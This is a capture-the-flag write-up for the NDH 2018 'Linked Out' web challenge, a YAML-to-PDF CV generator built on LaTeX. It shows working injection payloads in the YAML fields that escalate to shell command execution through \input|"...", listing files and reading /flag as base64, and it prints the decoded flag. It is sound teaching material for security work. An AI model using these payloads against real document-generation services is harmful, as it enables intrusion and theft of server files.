---
title: Quals NDH 2018 - Linked Out
authors: cnotin
layout: writeup
---
Solves: 58 / Points: 300 / Category: Web
## Challenge description
> This service build an awesome curriculum vitae for you ! Test it, recruiters will enjoy it ! The developper of this chall too ;)

We have a "Curriculum Vitæ Generator" website where we can upload a little form in YAML format with all the required information.
Once the form is uploaded, a very nice resume is generated in PDF format with the provided information.

The website explains that tool it uses is *[posquit0's Awesome-CV](https://github.com/posquit0/Awesome-CV)*.

## Challenge resolution
### LaTeX injection
Here is the beginning of the sample YAML file:
```yaml
cv:
  personal_informations:
    firstname: Bruce
    lastname: Schneier
    address: 221b Baker Street, London, ENGLAND
    position: Security Expert ; Master of Internet
  contacts:
    mobile: +12 3 456 789 012
    email: bruce.schneier@it-is-not-my-real-email.com
    homepage: https://www.schneier.com/
    github: schneier-not-my-real-account
    gitlab: schneier-not-my-real-account
    linkedin: schneier-not-my-real-account
    twitter: schneierblog
    skype: schneier-not-my-real-account
    reddit: schneier-not-my-real-account
    xing: schneier-not-my-real-account
  misc:
    extrainfo: Buy one of my books!
    quote: '"Bruce Schneier knows your password before you do." --- https://www.schneierfacts.com'
[...]
```

We know that the used tool is based on LaTeX. It expects a `.tex` file with information in the following format:
```tex
\twitter{@twit}
\skype{skype-id}
\reddit{reddit-id}
\extrainfo{extra informations}
[...]
```

Our first intuition is that our inputs are simply inserted in the `.tex` file. So we could inject arbitrary LaTeX instructions.
Let's verify by trying to close an instruction then re-open it:
```yaml
    skype: BBBBBBBBBBBBBB}\skype{AAAAAAAAAA
```

The injection is successful since the generated PDF returns `AAAAAAAAAA` in the Skype field instead of `BBBBBBBBBBBBBB`:
![Linked Out injection](/assets/linkedout-injection.png){: .image }

### LaTeX injection to command execution
So we can inject LaTeX instructions: now, how to obtain the flag?
We remembered [articles about code injection in LaTeX files](https://0day.work/hacking-with-latex/). There are some prerequisites but we might get lucky.

We found a [Stack Exchange answer](https://tex.stackexchange.com/a/20566) sharing a nice compact syntax to execute shell commands and include the output in the document. Let's try it:
```yaml
    skype: BBBBBBBBBBBBBB}\skype{\input|"ls *"}%
```
It was indeed successful:
![Linked Out ls command](/assets/linkedout-command-ls.png){: .image }

### Get the flag
Extracting the flag with a `cat` command did not work. We thought that its content could create an invalid `.tex` file.
Therefore we used `base64` to obtain it encoded.
```yaml
  skype: BBBBBBBBBBBBBB}\skype{\input|"base64 /flag"}%
```
![Linked Out base64 flag](/assets/linkedout-flag-b64.png){: .image }

Decode it and get the flag:
```shell
$ echo -ne "TkRIe0FuZF9Eb25hbGRfS251dGhfY3JlYXRlZF90aGVfaVRlWH0K" | base64 -d  -
NDH{And_Donald_Knuth_created_the_iTeX}
```
